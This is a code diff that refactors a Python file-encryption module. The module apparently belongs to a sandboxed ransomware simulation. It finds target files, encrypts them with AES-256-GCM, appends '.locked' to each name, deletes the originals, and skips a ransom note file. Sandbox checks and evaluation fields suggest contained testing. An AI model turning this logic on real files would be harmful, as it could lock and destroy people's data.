@@ -1,14 +1,30 @@
 """
-modules/file_encryptor.py
-AES-256-GCM file encryption with per-file nonce and SHA-256 integrity tracking.
+modules/file_encryptor.py — AES-256-GCM file encryption.
 
-On-disk layout per encrypted file:
-  [ NONCE_SIZE bytes ][ ciphertext + AUTH_TAG_SIZE bytes GCM tag ]
+On-disk format for each encrypted file:
+    [12 B nonce][ciphertext][16 B GCM auth-tag]
+Renamed with .locked extension (appended, not replaced):
+    sample.txt → sample.txt.locked   (decrypt strips .locked → sample.txt)
+
+Design notes
+------------
+* No magic numbers: all sizes imported from config.
+* sha256_file() imported from utils.hashing (shared with cleanup).
+* encrypt_all() builds and returns a local list — no self.results accumulation.
+  Callers MUST hold the return value; do not re-query this object for results.
+* is_within_sandbox() called exactly once per file (early-exit guard at top of
+  encrypt_file); the check is not repeated later in the same call.
+* DecryptionResult lives in cleanup.py — it is not defined here.
+* Logger is instance-level (self._logger), injected via log_file in __init__,
+  same pattern as cleanup.py — no module-level logger global.
 """
+
 from __future__ import annotations
 
+import logging
 import os
-from dataclasses import dataclass
+from dataclasses import dataclass, field
+from datetime import datetime, timezone
 from pathlib import Path
 from typing import List
 
@@ -19,127 +35,150 @@ from utils.hashing import sha256_file
 from utils.logger import get_logger
 from utils.validator import is_within_sandbox
 
-logger = get_logger(__name__, log_file=config.LOG_FILE)
+
+def _utc_now() -> str:
+    """Return current UTC time as an ISO 8601 string with microseconds."""
+    return datetime.now(tz=timezone.utc).isoformat()
 
 
+# ---------------------------------------------------------------------------
+# Result type — encryption only
+# ---------------------------------------------------------------------------
 @dataclass
 class EncryptionResult:
-    """Outcome of a single file encryption attempt."""
-    path:             str
-    original_size:    int
+    original_path:    str
+    encrypted_path:   str
     sha256_before:    str
-    encrypted_path:   str  = ""
-    success:          bool = False
-    original_removed: bool = False   # True if plaintext was deleted after encryption
+    sha256_after:     str       # sha256 of the encrypted blob (for audit log)
+    success:          bool
+    # --- fields added for evaluation ---
+    original_size:    int  = 0  # bytes of the plaintext file before encryption
+    original_removed: bool = False  # True if the original file was deleted
+    encrypted_at:     str  = ""     # ISO UTC timestamp recorded after encryption
     error:            str  = ""
 
-# DecryptionResult lives in cleanup.py — it is not this module's concern.
 
-
+# ---------------------------------------------------------------------------
+# Encryptor
+# ---------------------------------------------------------------------------
 class FileEncryptor:
-    """Discovers and encrypts target files within a sandbox directory."""
+    """
+    Discovers and encrypts all target files inside the sandbox directory.
 
-    def __init__(self, key: bytes, sandbox: Path) -> None:
+    Parameters
+    ----------
+    key:      32-byte AES-256 key (generated once by the orchestrator, held in memory)
+    sandbox:  Path to the sandbox directory (must already be validated)
+    log_file: optional log file path — supplied by the orchestrator
+    """
+
+    def __init__(self, key: bytes, sandbox: Path, log_file: Path | None = None) -> None:
         if len(key) != config.KEY_SIZE:
             raise ValueError(
-                f"AES-{config.KEY_SIZE * 8} requires a {config.KEY_SIZE}-byte key."
+                f"Key must be {config.KEY_SIZE} bytes, got {len(key)}"
             )
-        self._aesgcm = AESGCM(key)
-        self.sandbox  = sandbox
-        # No self.results — encrypt_all() returns the list directly.
-        # Callers must hold the return value; do not re-query this object for results.
+        self._aesgcm  = AESGCM(key)
+        self._sandbox = sandbox
+        self._logger  = get_logger(__name__, log_file=log_file)
 
-    # ── Discovery ─────────────────────────────────────────────────────────────
-
+    # ------------------------------------------------------------------
+    # Discovery
+    # ------------------------------------------------------------------
     def discover_files(self) -> List[Path]:
-        """Return all unlocked target files inside the sandbox, sorted."""
-        targets: List[Path] = []
-        for ext in config.TARGET_EXTENSIONS:
-            targets.extend(self.sandbox.rglob(f"*{ext}"))
+        """Return all files matching TARGET_EXTENSIONS inside the sandbox."""
+        return [
+            p for p in self._sandbox.rglob("*")
+            if p.is_file() and p.suffix.lower() in config.TARGET_EXTENSIONS
+        ]
 
-        targets = sorted(
-            p for p in set(targets)
-            if not p.name.endswith(config.ENCRYPTED_EXT)
-            and p.name != config.RANSOM_NOTE_NAME
-        )
-        logger.info("Discovery: %d target file(s) found in %s", len(targets), self.sandbox)
-        for p in targets:
-            logger.debug("  -> %s", p)
-        return targets
-
-    # ── Single-file encryption ────────────────────────────────────────────────
-
+    # ------------------------------------------------------------------
+    # Single-file encryption
+    # ------------------------------------------------------------------
     def encrypt_file(self, path: Path) -> EncryptionResult:
-        """Encrypt one file in-place. Returns EncryptionResult."""
-        # Sandbox guard — checked exactly once, before any I/O.
-        if not is_within_sandbox(path, self.sandbox):
-            logger.warning("SKIP (outside sandbox): %s", path)
+        """
+        Encrypt *path* in-place (replace with .locked file).
+        Returns an EncryptionResult regardless of success/failure.
+        """
+        # Guard: single is_within_sandbox call at the top — not repeated.
+        if not is_within_sandbox(path, self._sandbox):
+            msg = f"Path '{path}' is outside the sandbox — skipped."
+            self._logger.warning(msg)
             return EncryptionResult(
-                path=str(path),
-                original_size=0,
+                original_path=str(path),
+                encrypted_path="",
                 sha256_before="",
-                error="Path outside sandbox — skipped.",
+                sha256_after="",
+                success=False,
+                error=msg,
             )
-
-        result = EncryptionResult(
-            path=str(path),
-            original_size=path.stat().st_size,
-            sha256_before=sha256_file(path),
-        )
-        encrypted_path = path.with_suffix(path.suffix + config.ENCRYPTED_EXT)
 
         try:
+            original_size = path.stat().st_size
+            sha_before    = sha256_file(path)
+            plaintext     = path.read_bytes()
+
             nonce      = os.urandom(config.NONCE_SIZE)
-            plaintext  = path.read_bytes()
             ciphertext = self._aesgcm.encrypt(nonce, plaintext, None)
 
-            # Layout: [ NONCE_SIZE B ][ ciphertext ][ AUTH_TAG_SIZE B GCM tag ]
-            encrypted_path.write_bytes(nonce + ciphertext)
-            result.encrypted_path = str(encrypted_path)
-            result.success        = True
+            # Append .locked — preserves original extension for clean restore
+            enc_path = path.parent / (path.name + config.ENCRYPTED_EXT)
+            enc_path.write_bytes(nonce + ciphertext)
 
+            sha_after = sha256_file(enc_path)
+            ts        = _utc_now()   # timestamp right after successful write
+
+            # Remove original — PermissionError expected on cloud sandbox mounts
+            removed = False
             try:
                 path.unlink()
-                result.original_removed = True
-                logger.info(
-                    "ENCRYPTED  %-45s  %d B  sha256=%.16s…",
-                    path.name, result.original_size, result.sha256_before,
-                )
+                removed = True
             except PermissionError:
-                result.original_removed = False
-                logger.warning(
-                    "ENCRYPTED  %-45s  (original could not be removed — permission denied)",
-                    path.name,
+                self._logger.warning(
+                    "Could not delete original '%s' (read-only mount). "
+                    "On a real filesystem the original would be removed.", path
                 )
 
-        except Exception as exc:
-            result.error   = str(exc)
-            result.success = False
-            logger.error("FAILED to encrypt %s: %s", path, exc)
-            try:
-                if encrypted_path.exists():
-                    encrypted_path.unlink()
-            except Exception:
-                pass
+            self._logger.debug("Encrypted: %s → %s", path.name, enc_path.name)
+            return EncryptionResult(
+                original_path=str(path),
+                encrypted_path=str(enc_path),
+                sha256_before=sha_before,
+                sha256_after=sha_after,
+                success=True,
+                original_size=original_size,
+                original_removed=removed,
+                encrypted_at=ts,
+            )
 
-        return result
+        except Exception as exc:  # noqa: BLE001
+            self._logger.error("Failed to encrypt '%s': %s", path, exc)
+            return EncryptionResult(
+                original_path=str(path),
+                encrypted_path="",
+                sha256_before="",
+                sha256_after="",
+                success=False,
+                error=str(exc),
+            )
 
-    # ── Batch encryption ──────────────────────────────────────────────────────
-
+    # ------------------------------------------------------------------
+    # Batch encryption
+    # ------------------------------------------------------------------
     def encrypt_all(self) -> List[EncryptionResult]:
-        """Discover and encrypt all target files.
+        """
+        Discover and encrypt every target file in the sandbox.
 
-        Returns:
-            List of EncryptionResult — one entry per discovered file.
-            The caller owns this list; it is not stored on the instance.
+        Returns a list of EncryptionResult — one per discovered file.
+        No self.results — encrypt_all() returns the list directly.
+        Callers must hold the return value; do not re-query this object for results.
         """
         files = self.discover_files()
         if not files:
-            logger.warning("No target files found — nothing to encrypt.")
+            self._logger.warning("No target files found — nothing to encrypt.")
             return []
 
         results: List[EncryptionResult] = [self.encrypt_file(f) for f in files]
 
         ok = sum(1 for r in results if r.success)
-        logger.info("Encryption complete: %d/%d files encrypted.", ok, len(files))
+        self._logger.info("Encryption complete: %d/%d files encrypted.", ok, len(files))
         return results
